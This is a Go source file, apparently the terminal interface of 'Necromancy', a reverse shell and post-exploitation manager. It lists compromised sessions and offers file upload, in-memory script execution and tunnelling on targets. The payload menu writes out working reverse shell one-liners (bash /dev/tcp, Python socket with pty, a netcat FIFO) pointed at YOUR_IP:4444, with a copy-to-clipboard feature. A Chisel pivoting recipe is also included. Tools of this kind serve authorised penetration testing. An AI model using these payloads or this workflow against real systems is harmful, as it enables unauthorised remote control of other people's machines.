package ui

import (
	"bufio"
	"fmt"
	"log"
	"os"
	"os/exec"
	"regexp"
	"runtime"
	"strings"

	"github.com/Aryma-f4/necromancy/core"
	"github.com/Aryma-f4/necromancy/modules"
	"github.com/Aryma-f4/necromancy/pty"
	"github.com/gdamore/tcell/v2"
	"github.com/rivo/tview"
)

// getBannerFromFile reads and parses the ASCII banner from file
func getBannerFromFile() string {
	file, err := os.Open("ascii.txt")
	if err != nil {
		// Fallback to simple text banner if file not found
		return "[yellow]NECROMANCY[-]\n[blue]Advanced Shell Manager[-]"
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		// Parse BBCode color tags for tview
		line = parseBBCodeForTview(line)
		lines = append(lines, line)
	}

	if err := scanner.Err(); err != nil {
		return "[yellow]NECROMANCY[-]\n[blue]Advanced Shell Manager[-]"
	}

	return strings.Join(lines, "\n")
}

// parseBBCodeForTview converts BBCode color tags to tview format
func parseBBCodeForTview(text string) string {
	// Convert [color=#hex] to tview color format
	colorPattern := regexp.MustCompile(`\[color=([^\]]+)\]`)
	text = colorPattern.ReplaceAllString(text, "[$1]")

	// Convert [/color] to tview reset
	text = strings.ReplaceAll(text, "[/color]", "[-:-:-]")

	// Remove size and font tags
	text = regexp.MustCompile(`\[size=[^\]]+\]`).ReplaceAllString(text, "")
	text = regexp.MustCompile(`\[/size\]`).ReplaceAllString(text, "")
	text = regexp.MustCompile(`\[font=[^\]]+\]`).ReplaceAllString(text, "")
	text = regexp.MustCompile(`\[/font\]`).ReplaceAllString(text, "")

	// Remove HTML span tags
	text = regexp.MustCompile(`<span[^>]*>`).ReplaceAllString(text, "")
	text = regexp.MustCompile(`</span>`).ReplaceAllString(text, "")

	return text
}

type App struct {
	tviewApp *tview.Application
	pages    *tview.Pages
	sessions *core.SessionManager
	menuList *tview.List
}

type payloadDefinition struct {
	Name        string
	Description string
	Command     string
}

func payloadDefinitions() []payloadDefinition {
	return []payloadDefinition{
		{
			Name:        "Bash",
			Description: "Classic bash TCP reverse shell",
			Command:     "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1",
		},
		{
			Name:        "Python",
			Description: "Python PTY reverse shell",
			Command:     `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'`,
		},
		{
			Name:        "Netcat",
			Description: "FIFO-based netcat reverse shell",
			Command:     "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 4444 >/tmp/f",
		},
	}
}

func copyTextToClipboard(text string) error {
	type candidate struct {
		name string
		args []string
	}

	candidates := []candidate{}
	switch runtime.GOOS {
	case "darwin":
		candidates = append(candidates, candidate{name: "pbcopy"})
	case "windows":
		candidates = append(candidates, candidate{name: "clip"})
	default:
		candidates = append(candidates,
			candidate{name: "wl-copy"},
			candidate{name: "xclip", args: []string{"-selection", "clipboard"}},
			candidate{name: "xsel", args: []string{"--clipboard", "--input"}},
		)
	}

	var lastErr error
	for _, candidate := range candidates {
		path, err := exec.LookPath(candidate.name)
		if err != nil {
			lastErr = err
			continue
		}
		cmd := exec.Command(path, candidate.args...)
		cmd.Stdin = strings.NewReader(text)
		if err := cmd.Run(); err == nil {
			return nil
		} else {
			lastErr = err
		}
	}

	if lastErr != nil {
		return fmt.Errorf("clipboard tool not available: %w", lastErr)
	}
	return fmt.Errorf("clipboard tool not available")
}

func (a *App) mainMenuSummary() string {
	activeSessions := len(a.sessions.GetAll())
	return fmt.Sprintf(
		"[yellow]Necromancy[white]\n"+
			"[green]Active sessions:[white] %d\n\n"+
			"[yellow]Quick keys[white]\n"+
			"[green]s[white] Sessions\n"+
			"[green]p[white] Payloads\n"+
			"[green]m[white] Modules\n"+
			"[green]i[white] Interfaces\n"+
			"[green]q[white] Exit\n\n"+
			"[yellow]Tips[white]\n"+
			"- Use arrow keys to move\n"+
			"- Press Enter to open\n"+
			"- Press Esc to go back from tools",
		activeSessions,
	)
}

func mainMenuDetails(mainText, secondaryText string) string {
	return fmt.Sprintf(
		"[yellow]Selected[white]\n"+
			"[green]%s[white]\n\n"+
			"%s\n\n"+
			"[yellow]Action[white]\n"+
			"Press [green]Enter[white] to open this section.",
		mainText,
		secondaryText,
	)
}

func newBannerView() *tview.TextView {
	banner := tview.NewTextView().
		SetDynamicColors(true).
		SetTextAlign(tview.AlignCenter)

	banner.SetBackgroundColor(tcell.ColorBlack)
	banner.SetWrap(false)
	banner.SetWordWrap(false)
	banner.SetText(getBannerFromFile() + "\n[gray] v1.0.0 - Advanced Shell Manager [-]\n[gray] https://github.com/Aryma-f4/necromancy [-]\n")

	return banner
}

func wrapWithBanner(content tview.Primitive, focusContent bool) tview.Primitive {
	flex := tview.NewFlex().SetDirection(tview.FlexRow)
	flex.SetBackgroundColor(tcell.ColorBlack)
	flex.AddItem(newBannerView(), 0, 1, false)
	flex.AddItem(content, 0, 2, focusContent)
	return flex
}

func NewApp(sm *core.SessionManager) *App {
	return &App{
		tviewApp: tview.NewApplication(),
		pages:    tview.NewPages(),
		sessions: sm,
	}
}

func (a *App) Setup() {
	// Set custom colors for better visibility
	tview.Styles.PrimitiveBackgroundColor = tcell.ColorBlack
	tview.Styles.ContrastBackgroundColor = tcell.ColorDarkBlue
	tview.Styles.MoreContrastBackgroundColor = tcell.ColorBlue
	tview.Styles.BorderColor = tcell.ColorBlue
	tview.Styles.TitleColor = tcell.ColorYellow
	tview.Styles.GraphicsColor = tcell.ColorWhite
	tview.Styles.PrimaryTextColor = tcell.ColorWhite
	tview.Styles.SecondaryTextColor = tcell.ColorGreen
	tview.Styles.TertiaryTextColor = tcell.ColorDarkGray
	tview.Styles.InverseTextColor = tcell.ColorBlack
	tview.Styles.ContrastSecondaryTextColor = tcell.ColorDarkGreen

	// Create a cleaner and more interactive main menu layout.
	root := tview.NewFlex().SetDirection(tview.FlexRow)
	header := tview.NewTextView().
		SetDynamicColors(true).
		SetTextAlign(tview.AlignCenter)
	header.SetBackgroundColor(tcell.ColorBlack)
	header.SetText("[yellow]Necromancy Main Menu[white]  [gray]v1.0[-]\n[green]Interactive reverse shell manager[-]")

	a.menuList = tview.NewList().
		AddItem("View Sessions", "List all active reverse shells", 's', a.showSessionsList).
		AddItem("Show Payloads", "Show reverse shell payloads", 'p', a.showPayloads).
		AddItem("Show Modules", "List available post-exploitation modules", 'm', a.showAllModules).
		AddItem("Interfaces", "List local network interfaces", 'i', a.showInterfaces).
		AddItem("Exit", "Quit application", 'q', func() {
			a.tviewApp.Stop()
		})

	a.menuList.SetBorder(true).SetTitle(" Necromancy Main Menu v1.0 ")
	a.menuList.SetBackgroundColor(tcell.ColorBlack)

	// Set highlight colors for better visibility
	a.menuList.SetHighlightFullLine(true)
	a.menuList.SetMainTextColor(tcell.ColorWhite)
	a.menuList.SetSecondaryTextColor(tcell.ColorGreen)
	a.menuList.SetSelectedBackgroundColor(tcell.ColorDarkBlue)
	a.menuList.SetSelectedTextColor(tcell.ColorYellow)
	a.menuList.ShowSecondaryText(true)

	infoView := tview.NewTextView().
		SetDynamicColors(true).
		SetWrap(true)
	infoView.SetBorder(true).SetTitle(" Details ")
	infoView.SetBackgroundColor(tcell.ColorBlack)
	infoView.SetText(a.mainMenuSummary())

	footer := tview.NewTextView().
		SetDynamicColors(true).
		SetTextAlign(tview.AlignCenter)
	footer.SetBackgroundColor(tcell.ColorBlack)
	footer.SetText("[gray]Navigate with arrows | Enter to select | q to quit[-]")

	a.menuList.SetChangedFunc(func(index int, mainText string, secondaryText string, shortcut rune) {
		if mainText == "" {
			infoView.SetText(a.mainMenuSummary())
			return
		}
		infoView.SetText(mainMenuDetails(mainText, secondaryText))
	})

	body := tview.NewFlex().
		AddItem(a.menuList, 0, 3, true).
		AddItem(infoView, 0, 2, false)

	root.AddItem(header, 2, 0, false)
	root.AddItem(body, 0, 1, true)
	root.AddItem(footer, 1, 0, false)

	a.pages.AddPage("menu", root, true, true)
}

func (a *App) Run() error {
	return a.tviewApp.SetRoot(a.pages, true).EnableMouse(true).Run()
}

func (a *App) showSessionsList() {
	list := tview.NewList()
	list.SetBorder(true).SetTitle(" Active Sessions (Esc to go back) ")

	sess := a.sessions.GetAll()
	if len(sess) == 0 {
		list.AddItem("No active sessions.", "Wait for a reverse shell to connect...", 'n', nil)
	} else {
		for i, s := range sess {
			idx := i
			shortcut := rune('1' + idx)
			title := fmt.Sprintf("Session %d: %s [%s]", s.ID, s.RemoteAddr, s.Type)

			list.AddItem(title, "Connect to shell", shortcut, func() {
				a.showSessionActions(s.ID)
			})
		}
	}

	list.SetInputCapture(func(event *tcell.EventKey) *tcell.EventKey {
		if event.Key() == tcell.KeyEscape {
			a.pages.SwitchToPage("menu")
			return nil
		}
		return event
	})

	list.SetBackgroundColor(tcell.ColorBlack)
	a.pages.AddPage("sessions", list, true, true)
}

func (a *App) UpdateSessionsList() {
	a.tviewApp.QueueUpdateDraw(func() {
		a.showSessionsList()
	})
}

func (a *App) showSessionActions(id int) {
	_, exists := a.sessions.Get(id)
	if !exists {
		return
	}

	list := tview.NewList().
		AddItem("Interact", "Connect to the shell", 'i', func() {
			a.openSessionTerminal(id)
		}).
		AddItem("Cancel Commands", "Send interrupt and stop running session commands", 'c', func() {
			session, exists := a.sessions.Get(id)
			if !exists {
				a.showSessionsList()
				return
			}
			if err := session.CancelRunningCommands(); err != nil {
				log.Printf("Cancel commands error: %v", err)
			}
			a.showSessionActions(id)
		}).
		AddItem("Run Module", "Run a post-exploitation module", 'm', func() {
			a.showModulesList(id)
		}).
		AddItem("Upload File", "Upload a local file to target via base64", 'u', func() {
			a.showUploadForm(id)
		}).
		AddItem("In-Memory Exec", "Execute a local script on target in-memory", 'e', func() {
			a.showExecForm(id)
		}).
		AddItem("Port Forwarding", "Set up tunneling / proxying", 'p', func() {
			a.showPortFwd(id)
		}).
		AddItem("Kill", "Terminate the session", 'k', func() {
			a.sessions.Remove(id)
			a.showSessionsList()
		})

	list.SetBorder(true).SetTitle(fmt.Sprintf(" Actions for Session %d ", id))
	list.SetInputCapture(func(event *tcell.EventKey) *tcell.EventKey {
		if event.Key() == tcell.KeyEscape {
			a.showSessionsList()
			return nil
		}
		return event
	})

	list.SetBackgroundColor(tcell.ColorBlack)
	a.pages.AddPage("session_actions", wrapWithBanner(list, true), true, true)
}

func (a *App) showUploadForm(id int) {
	session, exists := a.sessions.Get(id)
	if !exists {
		return
	}

	form := tview.NewForm().
		AddInputField("Local File", "", 40, nil, nil).
		AddInputField("Remote Destination", "/tmp/uploaded", 40, nil, nil)

	form.AddButton("Upload", func() {
		local := form.GetFormItem(0).(*tview.InputField).GetText()
		remote := form.GetFormItem(1).(*tview.InputField).GetText()
		if local != "" && remote != "" {
			// Do upload
			err := modules.UploadFile(session, local, remote)
			if err != nil {
				log.Printf("Upload error: %v", err)
			}
		}
		a.showSessionActions(id)
	}).
		AddButton("Cancel", func() {
			a.showSessionActions(id)
		})

	form.SetBorder(true).SetTitle(fmt.Sprintf(" Upload to Session %d ", id))
	form.SetBackgroundColor(tcell.ColorBlack)
	a.pages.AddPage("upload_form", wrapWithBanner(form, true), true, true)
}

func (a *App) showExecForm(id int) {
	session, exists := a.sessions.Get(id)
	if !exists {
		return
	}

	form := tview.NewForm().
		AddInputField("Local Script", "", 40, nil, nil)

	form.AddButton("Execute", func() {
		local := form.GetFormItem(0).(*tview.InputField).GetText()
		if local != "" {
			err := modules.ExecuteInMemory(session, local)
			if err != nil {
				log.Printf("Execute error: %v", err)
			}
		}
		a.showSessionActions(id)
	}).
		AddButton("Cancel", func() {
			a.showSessionActions(id)
		})

	form.SetBorder(true).SetTitle(fmt.Sprintf(" Execute In-Memory on Session %d ", id))
	form.SetBackgroundColor(tcell.ColorBlack)
	a.pages.AddPage("exec_form", wrapWithBanner(form, true), true, true)
}

func (a *App) showPortFwd(id int) {
	tv := tview.NewTextView().SetDynamicColors(true)
	tv.SetBorder(true).SetTitle(fmt.Sprintf(" Port Forwarding (Session %d) ", id))

	instructions := `[yellow]Port Forwarding / Pivoting[white]

To tunnel traffic through this shell, we recommend using Chisel.
Since Python is no longer used for the background agent, the native Go
method is to upload a statically compiled Chisel binary or run Ligolo.

1. Upload chisel to the target:
   (Go back, select 'Upload File', upload your local chisel binary)

2. Execute Chisel on the target to connect back to your server:
   ./chisel client YOUR_IP:8080 R:socks

3. Run Chisel server locally:
   chisel server -p 8080 --reverse

[green]Note: You can also use the 'Run Module' menu to automate Ligolo/Chisel setup.[white]
`
	tv.SetText(instructions)
	tv.SetInputCapture(func(event *tcell.EventKey) *tcell.EventKey {
		if event.Key() == tcell.KeyEscape {
			a.showSessionActions(id)
			return nil
		}
		return event
	})
	tv.SetBackgroundColor(tcell.ColorBlack)
	a.pages.AddPage("portfwd", wrapWithBanner(tv, true), true, true)
}

func (a *App) showModulesList(id int) {
	session, exists := a.sessions.Get(id)
	if !exists {
		return
	}

	mm := modules.NewModuleManager()
	list := tview.NewList()

	for name, mod := range mm.Modules {
		modName := name
		list.AddItem(modName, mod.Description(), 0, func() {
			err := mm.RunModule(modName, session)
			if err != nil {
				log.Printf("Module error: %v", err)
				a.showSessionActions(id)
				return
			}
			a.openSessionTerminal(id)
		})
	}

	list.SetBorder(true).SetTitle(fmt.Sprintf(" Modules for Session %d ", id))
	list.SetInputCapture(func(event *tcell.EventKey) *tcell.EventKey {
		if event.Key() == tcell.KeyEscape {
			a.showSessionActions(id)
			return nil
		}
		return event
	})

	list.SetBackgroundColor(tcell.ColorBlack)
	a.pages.AddPage("modules_list", wrapWithBanner(list, true), true, true)
}

func (a *App) openSessionTerminal(id int) {
	session, exists := a.sessions.Get(id)
	if !exists {
		return
	}

	// 1. Suspend the Tview Application to drop into raw terminal
	a.tviewApp.Suspend(func() {
		// 2. Clear terminal screen
		fmt.Print("\033[H\033[2J")

		// 3. Auto PTY upgrade if it's the first time connecting
		if session.Type != "PTY" {
			fmt.Printf("[*] Auto-upgrading Session %d to PTY...\n", session.ID)
			err := pty.AutoUpgrade(session)
			if err != nil {
				log.Printf("PTY upgrade failed: %v", err)
			}
		}

		// 4. Drop into raw mode interaction loop
		core.Interact(session)
	})

	// Return back to session list after Detach (F12)
	a.showSessionsList()
}

func (a *App) showInterfaces() {
	tv := tview.NewTextView().SetDynamicColors(true)
	tv.SetBorder(true).SetTitle(" Network Interfaces (Esc to go back) ")
	tv.SetText(core.GetInterfaces())
	tv.SetInputCapture(func(event *tcell.EventKey) *tcell.EventKey {
		if event.Key() == tcell.KeyEscape {
			a.pages.SwitchToPage("menu")
			return nil
		}
		return event
	})
	tv.SetBackgroundColor(tcell.ColorBlack)
	a.pages.AddPage("interfaces", wrapWithBanner(tv, true), true, true)
}
func (a *App) showPayloads() {
	payloads := payloadDefinitions()

	list := tview.NewList()
	list.SetBorder(true).SetTitle(" Payload Types ")
	list.SetBackgroundColor(tcell.ColorBlack)
	list.SetHighlightFullLine(true)

	preview := tview.NewTextView().
		SetDynamicColors(true).
		SetWrap(true)
	preview.SetBorder(true).SetTitle(" Payload Preview ")
	preview.SetBackgroundColor(tcell.ColorBlack)

	status := tview.NewTextView().
		SetDynamicColors(true).
		SetTextAlign(tview.AlignCenter)
	status.SetBackgroundColor(tcell.ColorBlack)
	status.SetText("[gray]Enter to inspect | c to copy selected payload | Esc to go back[-]")

	updatePreview := func(index int) {
		if index < 0 || index >= len(payloads) {
			return
		}
		item := payloads[index]
		preview.SetText(fmt.Sprintf("[yellow]%s[white]\n[green]%s[white]\n\n%s", item.Name, item.Description, item.Command))
	}

	for i, payload := range payloads {
		idx := i
		list.AddItem(payload.Name, payload.Description, 0, func() {
			updatePreview(idx)
		})
	}

	list.SetChangedFunc(func(index int, mainText string, secondaryText string, shortcut rune) {
		updatePreview(index)
	})

	updatePreview(0)

	root := tview.NewFlex().
		AddItem(list, 0, 2, true).
		AddItem(preview, 0, 3, false)
	layout := tview.NewFlex().SetDirection(tview.FlexRow).
		AddItem(root, 0, 1, true).
		AddItem(status, 1, 0, false)

	layout.SetInputCapture(func(event *tcell.EventKey) *tcell.EventKey {
		if event.Key() == tcell.KeyEscape {
			a.pages.SwitchToPage("menu")
			return nil
		}
		if event.Key() == tcell.KeyRune && (event.Rune() == 'c' || event.Rune() == 'C') {
			index := list.GetCurrentItem()
			if index >= 0 && index < len(payloads) {
				if err := copyTextToClipboard(payloads[index].Command); err != nil {
					status.SetText(fmt.Sprintf("[red]Copy failed:[white] %v", err))
				} else {
					status.SetText(fmt.Sprintf("[green]Copied:[white] %s", payloads[index].Name))
				}
			}
			return nil
		}
		return event
	})

	a.pages.AddPage("payloads", wrapWithBanner(layout, true), true, true)
}

func (a *App) showAllModules() {
	mm := modules.NewModuleManager()
	list := tview.NewList()
	list.SetBorder(true).SetTitle(" Available Modules (Esc to go back) ")

	// Add all modules to the list
	for name, mod := range mm.Modules {
		modName := name
		modDesc := mod.Description()
		list.AddItem(modName, modDesc, 0, nil)
	}

	list.SetInputCapture(func(event *tcell.EventKey) *tcell.EventKey {
		if event.Key() == tcell.KeyEscape {
			a.pages.SwitchToPage("menu")
			return nil
		}
		return event
	})

	list.SetBackgroundColor(tcell.ColorBlack)
	a.pages.AddPage("all_modules", wrapWithBanner(list, true), true, true)
}
